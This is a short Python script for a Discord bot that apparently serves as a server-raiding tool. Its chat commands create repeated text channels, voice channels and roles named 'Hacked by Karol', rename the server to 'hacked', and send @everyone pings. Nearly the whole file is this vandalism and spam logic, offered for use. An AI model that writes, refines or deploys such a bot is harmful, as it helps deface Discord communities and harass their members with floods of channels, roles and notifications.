import discord


client = discord.Client()


@client.event
async def on_ready():
    print('Has login as {0.user}'.format(client))
    activity = discord.Activity(name='1man1jar', type=discord.ActivityType.watching)
    await client.change_presence(activity=activity)


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('.kyll'):
        guild = message.author.guild
        count = 0
        while (count < 3):
            await guild.create_text_channel('Hacked by Karol')#all functions
            await guild.create_role(name="Hacked by Karol")
            await guild.edit(reason = None, name = "Hacked by Karol")
            await guild.create_voice_channel('Hacked by Karol')
            message.channel.send("@everyone")

            count += 1

    if message.content.startswith('.lol'):
        guild = message.author.guild
        btw = 0
        while (btw < 5):
            await guild.create_text_channel('hacked by Karol2')#only text channel spam
            btw += 1

    if message.content.startswith('.xd'):
        guild = message.author.guild
        yaw = 0
        while (yaw < 5):
            await guild.create_role(name="hacked by Karolxd")#only role spam
            yaw += 1
    
    if message.content.startswith('.d'):
        guild = message.author.guild#edits name of server
        await guild.edit(reason = None, name = "hacked")

    if message.content.startswith('.c'):
       guild = message.author.guild
       await message.channel.send("@everyone")
client.run('token')